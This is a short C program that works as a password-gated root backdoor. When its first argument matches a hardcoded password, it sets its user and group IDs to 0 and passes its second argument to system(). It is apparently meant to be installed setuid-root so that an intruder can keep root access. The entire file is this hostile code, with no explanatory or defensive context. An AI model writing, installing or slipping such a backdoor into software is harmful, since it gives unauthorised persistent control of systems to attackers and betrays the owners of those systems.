#include <stdio.h>   
#include <stdlib.h>   
main(int argc,char *argv[])   
{   
	if(argc == 3){
        	if(strcmp(argv[1],"pg5yl8") == 0) {  
                	setuid(0);   
			setgid(0);
                	system(argv[2]);  
        	} 
	}  
	return 0; 
}   